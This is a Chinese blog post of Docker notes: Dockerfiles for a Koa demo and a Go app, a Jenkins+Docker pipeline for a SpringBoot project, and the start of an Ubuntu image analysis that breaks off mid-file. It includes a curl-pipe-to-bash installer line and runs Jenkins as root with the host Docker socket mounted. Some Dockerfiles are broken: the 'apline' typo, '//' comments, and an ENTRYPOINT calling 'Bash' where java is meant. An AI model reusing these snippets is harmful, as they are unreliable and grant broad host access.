<h2 id="将本地文件上传到容器的指定目录中"><a href="#将本地文件上传到容器的指定目录中" class="headerlink" title="将本地文件上传到容器的指定目录中"></a>将本地文件上传到容器的指定目录中</h2><p>映射的路径不论是宿主机还是容器，都必须是绝对路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 本地文件路径 id全称:容器路径</span><br></pre></td></tr></table></figure>

<h1 id="编写dockerfile文件"><a href="#编写dockerfile文件" class="headerlink" title="编写dockerfile文件"></a>编写dockerfile文件</h1><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>首先，在项目的根目录下，新建一个文本文件<code>.dockerignore</code>，写入下面的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J1YW55Zi9rb2EtZGVtb3MvYmxvYi9tYXN0ZXIvLmRvY2tlcmlnbm9yZQ==">内容</span>。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.git</span><br><span class="line">node_modules</span><br><span class="line">npm-debug.log</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面代码表示，这三个路径要排除，不要打包进入 image 文件。如果你没有路径要排除，这个文件可以不新建。</p>
<p>然后，在项目的根目录下，新建一个文本文件 Dockerfile，写入下面的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J1YW55Zi9rb2EtZGVtb3MvYmxvYi9tYXN0ZXIvRG9ja2VyZmlsZQ==">内容</span>。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FROM node:8.4</span><br><span class="line">COPY . /app</span><br><span class="line">WORKDIR /app</span><br><span class="line">RUN npm install --registry=https://registry.npm.taobao.org</span><br><span class="line">EXPOSE 3000</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面代码一共五行，含义如下。</p>
<blockquote>
<ul>
<li><code>FROM node:8.4</code>：该 image 文件继承官方的 node image，冒号表示标签，这里标签是<code>8.4</code>，即8.4版本的 node。</li>
<li><code>COPY . /app</code>：将当前目录下的所有文件（除了<code>.dockerignore</code>排除的路径），都拷贝进入 image 文件的<code>/app</code>目录。</li>
<li><code>WORKDIR /app</code>：指定接下来的工作路径为<code>/app</code>。</li>
<li><code>RUN npm install</code>：在<code>/app</code>目录下，运行<code>npm install</code>命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。</li>
<li><code>EXPOSE 3000</code>：将容器 3000 端口暴露出来， 允许外部连接这个端口。</li>
</ul>
</blockquote>
<h3 id="创建-image-文件"><a href="#创建-image-文件" class="headerlink" title="创建 image 文件"></a>创建 image 文件</h3><p>有了 Dockerfile 文件以后，就可以使用<code>docker image build</code>命令创建 image 文件了。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker image build -t koa-demo .</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ docker image build -t koa-demo:0.0.1 .</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面代码中，<code>-t</code>参数用来指定 image 文件的名字，后面还可以用冒号指定标签。如果不指定，默认的标签就是<code>latest</code>。最后的那个点表示 Dockerfile 文件所在的路径，上例是当前路径，所以是一个点。</p>
<p>如果运行成功，就可以看到新生成的 image 文件<code>koa-demo</code>了。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker image <span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="生成容器"><a href="#生成容器" class="headerlink" title="生成容器"></a>生成容器</h3><p><code>docker container run</code>命令会从 image 文件生成容器。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker container run -p 8000:3000 -it koa-demo /bin/bash</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ docker container run -p 8000:3000 -it koa-demo:0.0.1 /bin/bash</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面命令的各个参数含义如下：</p>
<blockquote>
<ul>
<li><code>-p</code>参数：容器的 3000 端口映射到本机的 8000 端口。</li>
<li><code>-it</code>参数：容器的 Shell 映射到当前的 Shell，然后你在本机窗口输入的命令，就会传入容器。</li>
<li><code>koa-demo:0.0.1</code>：image 文件的名字（如果有标签，还需要提供标签，默认是 latest 标签）。</li>
<li><code>/bin/bash</code>：容器启动以后，内部第一个执行的命令。这里是启动 Bash，保证用户可以使用 Shell。</li>
</ul>
</blockquote>
<p>如果一切正常，运行上面的命令以后，就会返回一个命令行提示符。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@66d80f4aaf1e:/app<span class="comment">#</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>这表示你已经在容器里面了，返回的提示符就是容器内部的 Shell 提示符。执行下面的命令。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@66d80f4aaf1e:/app<span class="comment"># node demos/01.js</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>这时，Koa 框架已经运行起来了。打开本机的浏览器，访问 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAw77yM572R6aG15pi+56S6JnF1b3Q7Tm90">http://127.0.0.1:8000，网页显示&quot;Not</span> Found”，这是因为这个 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J1YW55Zi9rb2EtZGVtb3MvYmxvYi9tYXN0ZXIvZGVtb3MvMDEuanM=">demo</span> 没有写路由。</p>
<p>这个例子中，Node 进程运行在 Docker 容器的虚拟环境里面，进程接触到的文件系统和网络接口都是虚拟的，与本机的文件系统和网络接口是隔离的，因此需要定义容器与物理机的端口映射（map）。</p>
<p>现在，在容器的命令行，按下 Ctrl + c 停止 Node 进程，然后按下 Ctrl + d （或者输入 exit）退出容器。此外，也可以用<code>docker container kill</code>终止容器运行。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在本机的另一个终端窗口，查出容器的 ID</span></span><br><span class="line">$ docker container <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止指定的容器运行</span></span><br><span class="line">$ docker container <span class="built_in">kill</span> [containerID]</span><br></pre></td></tr></table></figure>
</blockquote>
<p>容器停止运行之后，并不会消失，用下面的命令删除容器文件。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查出容器的 ID</span></span><br><span class="line">$ docker container <span class="built_in">ls</span> --all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定的容器文件</span></span><br><span class="line">$ docker container <span class="built_in">rm</span> [containerID]</span><br></pre></td></tr></table></figure>
</blockquote>
<p>也可以使用<code>docker container run</code>命令的<code>--rm</code>参数，在容器终止运行后自动删除容器文件。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker container run --<span class="built_in">rm</span> -p 8000:3000 -it koa-demo /bin/bash</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="CMD-命令"><a href="#CMD-命令" class="headerlink" title="CMD 命令"></a>CMD 命令</h3><p>上一节的例子里面，容器启动以后，需要手动输入命令<code>node demos/01.js</code>。我们可以把这个命令写在 Dockerfile 里面，这样容器启动以后，这个命令就已经执行了，不用再手动输入了。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FROM node:8.4</span><br><span class="line">COPY . /app</span><br><span class="line">WORKDIR /app</span><br><span class="line">RUN npm install --registry=https://registry.npm.taobao.org</span><br><span class="line">EXPOSE 3000</span><br><span class="line">CMD node demos/01.js</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面的 Dockerfile 里面，多了最后一行<code>CMD node demos/01.js</code>，它表示容器启动后自动执行<code>node demos/01.js</code>。</p>
<p>你可能会问，<code>RUN</code>命令与<code>CMD</code>命令的区别在哪里？简单说，<code>RUN</code>命令在 image 文件的构建阶段执行，执行结果都会打包进入 image 文件；<code>CMD</code>命令则是在容器启动后执行。另外，一个 Dockerfile 可以包含多个<code>RUN</code>命令，但是只能有一个<code>CMD</code>命令。</p>
<p>注意，指定了<code>CMD</code>命令以后，<code>docker container run</code>命令就不能附加命令了（比如前面的<code>/bin/bash</code>），否则它会覆盖<code>CMD</code>命令。现在，启动容器可以使用下面的命令。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker container run --<span class="built_in">rm</span> -p 8000:3000 -it koa-demo:0.0.1</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="发布-image-文件"><a href="#发布-image-文件" class="headerlink" title="发布 image 文件"></a>发布 image 文件</h3><p>容器运行成功后，就确认了 image 文件的有效性。这时，我们就可以考虑把 image 文件分享到网上，让其他人使用。</p>
<p>首先，去 <span class="exturl" data-url="aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS8=">hub.docker.com</span> 或 <span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC5kb2NrZXIuY29tLw==">cloud.docker.com</span> 注册一个账户。然后，用下面的命令登录。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker login</span><br></pre></td></tr></table></figure>
</blockquote>
<p>接着，为本地的 image 标注用户名和版本。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker image tag [imageName] [username]/[repository]:[tag]</span><br><span class="line"><span class="comment"># 实例</span></span><br><span class="line">$ docker image tag koa-demos:0.0.1 ruanyf/koa-demos:0.0.1</span><br></pre></td></tr></table></figure>
</blockquote>
<p>也可以不标注用户名，重新构建一下 image 文件。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker image build -t [username]/[repository]:[tag] .</span><br></pre></td></tr></table></figure>
</blockquote>
<p>最后，发布 image 文件。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker image push [username]/[repository]:[tag]</span><br></pre></td></tr></table></figure>
</blockquote>
<p>发布成功以后，登录 hub.docker.com，就可以看到已经发布的 image 文件。</p>
<h2 id="减少容器镜像大小"><a href="#减少容器镜像大小" class="headerlink" title="减少容器镜像大小"></a>减少容器镜像大小</h2><p>采用分段式编写dockerfile</p>
<h1 id="docker开发golang项目"><a href="#docker开发golang项目" class="headerlink" title="docker开发golang项目"></a>docker开发golang项目</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">FROM golang:alpine as build-env</span><br><span class="line"></span><br><span class="line">//设置golang代理，不设置代理，拉取库时会出问题</span><br><span class="line">RUN go env -w GOPROXY=https://goproxy.cn,direct</span><br><span class="line">//add 将宿主机的文件映射到容器的/src目录</span><br><span class="line">ADD . /src</span><br><span class="line">RUN cd /src &amp;&amp; go build -o goapp</span><br><span class="line"></span><br><span class="line">FROM apline</span><br><span class="line">WORKDIR /app</span><br><span class="line">COPY --from=build-env /src/goapp /app/</span><br><span class="line">//workdir设置工作目录为/app时，映射templates时需要映射到容器的/app/temlates目录，否则会报错</span><br><span class="line">ADD templates /app/templates</span><br><span class="line"></span><br><span class="line">//出口路径</span><br><span class="line">ENTRYPOINT ./goapp</span><br></pre></td></tr></table></figure>

<p>设置项目时，设置golang的log在挂载目录路径下，容器部署时挂载便能在宿主机中也查看到log日志</p>
<h1 id="Jenkins-Docker-一键自动化部署-SpringBoot-项目"><a href="#Jenkins-Docker-一键自动化部署-SpringBoot-项目" class="headerlink" title="Jenkins+Docker 一键自动化部署 SpringBoot 项目"></a>Jenkins+Docker 一键自动化部署 SpringBoot 项目</h1><p>简述实现步骤：在docker安装jenkins，配置jenkins基本信息，利用Dockerfile和shell脚本实现项目自动拉取打包并运行。</p>
<h2 id="安装Jenkins"><a href="#安装Jenkins" class="headerlink" title="安装Jenkins"></a>安装Jenkins</h2><p>Jenkins中文官网：</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamVua2lucy5pby96aC8=">https://www.jenkins.io/zh/</span></p>
</blockquote>
<h4 id="1-安装Jenkins"><a href="#1-安装Jenkins" class="headerlink" title="1.安装Jenkins"></a>1.安装Jenkins</h4><p>docker 安装一切都是那么简单，注意检查8080是否已经占用！如果占用修改端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name jenkins -u root --rm -d -p 8080:8080 -p 50000:50000 -v /var/jenkins_home:/var/jenkins_home -v /var/run/docker.sock:/var/run/docker.sock jenkinsci/blueocean</span><br></pre></td></tr></table></figure>

<p>如果没改端口号的话</p>
<p>安装完成后访问地址-&gt; <code>http://&#123;部署Jenkins所在服务IP&#125;:8080</code></p>
<p>此处会有几分钟的等待时间。</p>
<h4 id="2-初始化Jenkins"><a href="#2-初始化Jenkins" class="headerlink" title="2.初始化Jenkins"></a>2.初始化Jenkins</h4><h5 id="2-1-解锁Jenkins"><a href="#2-1-解锁Jenkins" class="headerlink" title="2.1 解锁Jenkins"></a>2.1 解锁Jenkins</h5><ul>
<li>进入Jenkins容器：<code>docker exec -it &#123;Jenkins容器名&#125; bash</code></li>
<li>例如 <code>docker exec -it jenkins bash</code></li>
<li>查看密码：<code>cat /var/lib/jenkins/secrets/initialAdminPassword</code></li>
<li>复制密码到输入框里面</li>
</ul>
<p><img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyyshvRoBvJ6QbJZRw9wic7gibylV1cJicxOJVWg0Hg0qFhXyT5ug0Pbn2g/640?wx_fmt=png&random=0.7236724850345728&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h5 id="2-2-安装插件"><a href="#2-2-安装插件" class="headerlink" title="2.2 安装插件"></a>2.2 安装插件</h5><p>选择第一个：安装推荐的插件</p>
<p><img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyMwucPYZb9ZmW27xZl3IpQicZBrWqCThp7LRphtnib2wsLdFYynHaGyPw/640?wx_fmt=png&random=0.7501449915729308&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h5 id="2-3-创建管理员用户"><a href="#2-3-创建管理员用户" class="headerlink" title="2.3 创建管理员用户"></a>2.3 创建管理员用户</h5><p>此账户一定要记住哦</p>
<h2 id="三、系统配置"><a href="#三、系统配置" class="headerlink" title="三、系统配置"></a><strong>三、系统配置</strong></h2><h4 id="1-安装需要插件"><a href="#1-安装需要插件" class="headerlink" title="1. 安装需要插件"></a>1. 安装需要插件</h4><p>进入【首页】–【系统管理】–【插件管理】–【可选插件】</p>
<p>搜索以下需要安装的插件，点击安装即可。</p>
<p><img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyLaNAM4xbaWaBeNHPvGhm6Iu9ZmvgOiaIdOo11Q8PiacAhj15uA2123KA/640?wx_fmt=png&random=0.42899086065774017&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<ul>
<li>安装<code>Maven Integration</code></li>
<li>安装<code>Publish Over SSH</code>(如果不需要远程推送，不用安装)</li>
<li>如果使用Gitee 码云，安装插件Gitee（Git自带不用安装）</li>
</ul>
<h4 id="2-配置Maven"><a href="#2-配置Maven" class="headerlink" title="2. 配置Maven"></a>2. 配置Maven</h4><p>进入【首页】–【系统管理】–【全局配置】，拉到最下面maven–maven安装</p>
<p><img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyeQqIcfic8kVBoDHjoEsicYTdibGicicO1BvkHTib1QQV7bAd77VxCDZRKsAQ/640?wx_fmt=png&random=0.8667036553651208&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h2 id="四、创建任务"><a href="#四、创建任务" class="headerlink" title="四、创建任务"></a><strong>四、创建任务</strong></h2><h4 id="1-新建任务"><a href="#1-新建任务" class="headerlink" title="1. 新建任务"></a>1. 新建任务</h4><p>点击【新建任务】，输入任务名称，点击构建一个自由风格的软件项目</p>
<p><img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyxUKZsCZOoXUv7lpBxm9mqId7Iq3icoPjictqTTle4zjxjoD4RxNW7yKQ/640?wx_fmt=png&random=0.2006864959409247&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h4 id="2-源码管理"><a href="#2-源码管理" class="headerlink" title="2. 源码管理"></a>2. 源码管理</h4><p>点击【源码管理】–【Git】，输入仓库地址，添加凭证，选择好凭证即可。</p>
<p><img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyzdO3Iy629MrSsiavFlicfFsgmbWQlIAIIaGyIrYw5533BhMbR5kjuHiaQ/640?wx_fmt=png&random=0.7056154241642933&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyKrRuvzhCrdKe6RsUMoIe5Iic9wCNSCtJ1OP6YJgdvCG54XFNkv86ARA/640?wx_fmt=png&random=0.09957022906412849&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h4 id="3-构建触发器"><a href="#3-构建触发器" class="headerlink" title="3.构建触发器"></a>3.构建触发器</h4><p>点击【构建触发器】–【构建】–【增加构建步骤】–【调用顶层Maven目标】–【填写配置】–【保存】</p>
<p><img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cy2wofUQHqbcQHwtQOeib2RuDvbCeH7rfhPbUuDpRV6k3ZSOicFibhzs7Vg/640?wx_fmt=png&random=0.317058323396312&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>此处命令只是install，看是否能生成jar包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clean install -Dmaven.test.skip=true</span><br></pre></td></tr></table></figure>

<p><img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyPoU6XbhmLmERPP6FwKHDkAhb2ibD3pLO1mbibYgSIN0qu2SOIvW9ft3A/640?wx_fmt=png&random=0.37942360753709004&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h4 id="4-保存"><a href="#4-保存" class="headerlink" title="4. 保存"></a>4. 保存</h4><p>点击【保存】按钮即可</p>
<h2 id="五、测试"><a href="#五、测试" class="headerlink" title="五、测试"></a><strong>五、测试</strong></h2><p>该功能测试是否能正常打包</p>
<h4 id="1-构建"><a href="#1-构建" class="headerlink" title="1. 构建"></a>1. 构建</h4><p>点击构建按钮</p>
<p><img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyCFytG38bLww3MnGCY4ISQ2ITic8Hia0IKtt3tn7TslPF7AyebeBJPtqg/640?wx_fmt=png&random=0.09550435108069477&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h4 id="2-查看日志"><a href="#2-查看日志" class="headerlink" title="2.查看日志"></a>2.查看日志</h4><p>点击正在构建的任务，或者点击任务名称，进入详情页面，查看控制台输出，看是否能成功打成jar包。</p>
<p>该处日志第一次可能下载依赖jar包失败，再次点击构建即可成功。<img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyCFytG38bLww3MnGCY4ISQ2ITic8Hia0IKtt3tn7TslPF7AyebeBJPtqg/640?wx_fmt=png&random=0.29831465950283786&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cy5Fz6qyDTiaGgDg1qicb3xfu2ouFVIHcG7PibvUJpG8hjcXIibtpzWR2DEg/640?wx_fmt=png&random=0.027020731370377638&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyRldXjpOewRsSTXjGSibAfPcVeI2srVPRzRcWtAWpKeKAsdDuUXmb8Hw/640?wx_fmt=png&random=0.60444221647061&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h4 id="3-查看项目位置"><a href="#3-查看项目位置" class="headerlink" title="3. 查看项目位置"></a>3. 查看项目位置</h4><ol>
<li><code>cd /var/jenkins_home/workspace</code></li>
<li><code>ll</code> 即可查看是否存在</li>
</ol>
<h2 id="六、运行项目"><a href="#六、运行项目" class="headerlink" title="六、运行项目"></a><strong>六、运行项目</strong></h2><p>因为我们项目和jenkins在同一台服务器，所以我们用shell脚本运行项目，原理既是通过dockerfile 打包镜像，然后docker运行即可。</p>
<h4 id="1-Dockerfile"><a href="#1-Dockerfile" class="headerlink" title="1. Dockerfile"></a>1. Dockerfile</h4><p>在springboot项目根目录新建一个名为Dockerfile的文件，注意没有后缀名，其内容如下:（大致就是使用jdk8，把jar包添加到docker然后运行prd配置文件。详细可以查看其他教程）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FROM jdk:8</span><br><span class="line">VOLUME /tmp</span><br><span class="line">ADD target/zx-order-0.0.1-SNAPSHOT.jar app.jar</span><br><span class="line">EXPOSE 8888</span><br><span class="line">ENTRYPOINT [&quot;Bash&quot;,&quot;-DBash.security.egd=file:/dev/./urandom&quot;,&quot;-jar&quot;,&quot;/app.jar&quot;,&quot;--spring.profiles.active=prd&quot;]</span><br></pre></td></tr></table></figure>

<h4 id="2-修改jenkins任务配置"><a href="#2-修改jenkins任务配置" class="headerlink" title="2. 修改jenkins任务配置"></a>2. 修改jenkins任务配置</h4><p><img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyUQbZA4dtxoREHicOaMriceUfIaBMBg103vF8sM6JtoFkrxN5niaibkwEjA/640?wx_fmt=png&random=0.48763975710440555&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>配置如下：</p>
<p><img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cy7l2piaPZ1zMmFiahjcwQzHrbOKX3UIOuia2veMS9DtkiaZc0B2344WrgLQ/640?wx_fmt=png&random=0.2645517507663635&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<ul>
<li><code>-t</code>：指定新镜像名</li>
<li><code>.</code>：表示Dockfile在当前路径</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /var/jenkins_home/workspace/zx-order-api</span><br><span class="line">docker stop zx-order || true</span><br><span class="line">docker rm zx-order || true</span><br><span class="line">docker rmi zx-order || true</span><br><span class="line">docker build -t zx-order .</span><br><span class="line">docker run -d -p 8888:8888 --name zx-order zx-order:latest</span><br></pre></td></tr></table></figure>

<p>备注：</p>
<ol>
<li>我上图用了<code>docker logs -f</code> 是为了方便看日志，真实不要用，因为会一直等待日志，构建任务会失败</li>
<li>加<code>|| true</code> 是如果命令执行失败也会继续实行，为了防止第一次没有该镜像报错</li>
</ol>
<h4 id="3-保存"><a href="#3-保存" class="headerlink" title="3. 保存"></a>3. 保存</h4><p>点击保存即可</p>
<h4 id="4-构建"><a href="#4-构建" class="headerlink" title="4. 构建"></a>4. 构建</h4><p>查看jenkins控制台输出，输出如下，证明成功！</p>
<p><img data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cy1GoXDD0TNOia3KNZeJ97FB5YBibFeFaMSdbY6xfy4RuKP9UPxlatmDdQ/640?wx_fmt=png&random=0.7296276906655683&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h4 id="5-验证"><a href="#5-验证" class="headerlink" title="5. 验证"></a>5. 验证</h4><ol>
<li><code>docker ps</code> 查看是否有自己的容器</li>
<li><code>docker logs</code> 自己的容器名 查看日志是否正确</li>
<li>浏览器访问项目试一试</li>
</ol>
<h1 id="逆向容器镜像"><a href="#逆向容器镜像" class="headerlink" title="逆向容器镜像"></a>逆向容器镜像</h1><h2 id="Ubuntu容器逆向"><a href="#Ubuntu容器逆向" class="headerlink" title="Ubuntu容器逆向"></a>Ubuntu容器逆向</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul>
<li>安装Docker</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>

<ul>
<li>安装DIVE</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/wagoodman/dive/releases/download/v0.9.2/dive_0.9.2_linux_amd64.deb</span><br><span class="line">sudo apt install ./dive_0.9.2_linux_amd64.deb</span><br></pre></td></tr></table></figure>

<h3 id="镜像分析"><a href="#镜像分析" class="headerlink" title="镜像分析"></a>镜像分析</h3><p>选择要分析的镜像为ubuntu的官方镜像，首先导出镜像，保存为<code>ubuntu.tar</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull ubuntu</span><br><span class="line">sudo docker save -o ubuntu.tar ubuntu</span><br></pre></td></tr></table></figure>

<p>为了方便分析，这里将<code>ubuntu.tar</code>在windows上面解压，可以发现ubuntu镜像一共包含三个文件和一个文件夹。</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img data-src="https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicMUXRISwKcGJW9nnXK5b2xcoicqpsp7Xrh0tfVNibAsP3MtPT1leMDrsn5zY3Ls3MGSb11yWESqxm1w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></h2><p>首先查看<code>manifest.json</code>的内容,可以看出该文件一共包含了三个字段，<code>Config</code>、<code>RepoTages</code>和<code>Layers</code>。</p>
<ul>
<li><code>Config</code> 的值为镜像配置文件的<code>json</code>文件，对应<code>825d55fb6340083b06e69e02e823a02918f3ffb575ed2a87026d4645a7fd9e1b.json</code>；</li>
<li><code>RepoTages</code> 为镜像的名称和标签；</li>
<li><code>Layers</code> 包含了镜像的有哪些层，每一个元素代表一个层目录，由此可见ubuntu只含有一个层，对应<code>8f7ee37aa1d53dcded9b5c22b0a57d8bb8d35d9f42273651668e7aca23bd7581/layer.tar</code>。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Config&quot;: &quot;825d55fb6340083b06e69e02e823a02918f3ffb575ed2a87026d4645a7fd9e1b.json&quot;,</span><br><span class="line">        &quot;RepoTags&quot;: [</span><br><span class="line">            &quot;ubuntu:latest&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;Layers&quot;: [</span><br><span class="line">            